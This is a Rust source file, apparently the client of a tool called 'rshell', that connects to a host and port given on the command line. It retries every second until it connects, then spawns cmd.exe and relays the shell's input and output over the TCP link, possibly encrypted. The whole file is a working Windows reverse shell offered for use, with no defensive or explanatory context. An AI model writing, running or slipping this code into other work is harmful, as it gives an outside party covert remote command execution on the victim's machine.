use std::{net::ToSocketAddrs, process::exit, time::Duration};

use rshell::crypt::CryptSplit;
use smol::{future::FutureExt, net::TcpStream};

fn main() {
    let args: Vec<String> = std::env::args().collect();

    if args.len() < 3 {
        println!("用法: {} host port", args.get(0).unwrap());
        exit(1);
    }

    let addr = format!("{}:{}", args.get(1).unwrap(), args.get(2).unwrap());

    smol::block_on(async move {
        println!("connect to {}", addr);
        loop {
            match TcpStream::connect(
                addr.to_socket_addrs()
                    .expect("dns resolver failure")
                    .into_iter()
                    .next()
                    .expect("dns resolver failure"),
            )
            .await
            {
                Ok(tcp) => {
                    println!("connected!");

                    let mut child = smol::process::Command::new("cmd.exe")
                        .stdout(smol::process::Stdio::piped())
                        .stdin(smol::process::Stdio::piped())
                        .stderr(smol::process::Stdio::piped())
                        .spawn()
                        .unwrap();

                    let (io_reader, io_writer) = tcp.split(10);

                    let cio_reader = child.stdout.take().unwrap();
                    let cio_write = child.stdin.take().unwrap();
                    let cio_err = child.stderr.take().unwrap();

                    let io_err = io_reader.clone();

                    match smol::io::copy(cio_reader, io_writer)
                        .race(smol::io::copy(io_reader, cio_write))
                        .race(smol::io::copy(cio_err, io_err))
                        .await
                    {
                        Ok(_) => {}
                        Err(_) => {}
                    };
                }
                Err(_) => {
                    smol::Timer::after(Duration::from_secs(1)).await;
                }
            }
        }
    });
}
